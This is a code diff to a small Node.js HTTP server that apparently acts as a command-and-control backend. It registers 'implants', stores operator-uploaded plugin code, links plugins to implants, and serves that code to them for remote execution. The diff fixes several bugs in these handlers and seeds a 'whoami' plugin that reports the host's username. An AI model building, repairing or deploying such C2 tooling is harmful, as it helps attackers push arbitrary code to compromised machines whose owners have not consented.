@@ -11,6 +11,7 @@ const PC = "plugin_content";
 
 var implants = {}
 var known_plugins = {}
+known_plugins['whoami'] = "const os = require('node:os');console.log(os.userInfo().username);";
 
 const requestListener = function (req, res) {
     if (!(req.method == 'POST')) {
@@ -25,7 +26,7 @@ const requestListener = function (req, res) {
         });
         req.on('end', function () {
             var post = JSON.parse(body);
-            console.log(post);
+            console.log('POST',post);
             switch (req.url) {
                 case "/":
                     if (!(IN in post)) {
@@ -43,7 +44,9 @@ const requestListener = function (req, res) {
                     }
                     break
                 case "/plugin/":
-                    if (!(IN in post) || !(post[IN] in implants) || !(PN in post) || !(post[PN] in implants[PL])) {
+                    console.log(implants);
+                    console.log('DOWNLOADING',post[IN],post[PN],implants[post[IN]][PL].includes(post[PN]))
+                    if (!(IN in post) || !(post[IN] in implants) || !(PN in post) || !(implants[post[IN]][PL].includes(post[PN]))) {
                         res.writeHead(404);
                         res.end("Plugin or implant not found. Please correct.")
                     } else {
@@ -55,17 +58,18 @@ const requestListener = function (req, res) {
                     if (!(PN in post) || !(PC in post)) {
                         res.writeHead(404);
                         res.end("Plugin or implant not found. Please correct.")
+                    } else {
+                        known_plugins[post[PN]] = post[PC];
+                        res.writeHead(200);
+                        res.end("['OK']");
                     }
-                    known_plugins[post[PN]] = post[PC];
-                    res.writeHead(200);
-                    res.end("['OK']");
                     break
                 case "/linkimplantplugin/":
                     if (!(IN in post) || !(PN in post) || !(post[PN] in known_plugins) || !(post[IN] in implants)) {
                         res.writeHead(404);
                         res.end("Plugin or implant not found. Please correct.")
                     } else {
-                        implants[post[IN]][PL].push(post(PN));
+                        implants[post[IN]][PL].push(post[PN]);
                         res.writeHead(200);
                         res.end("['OK']");
                     }
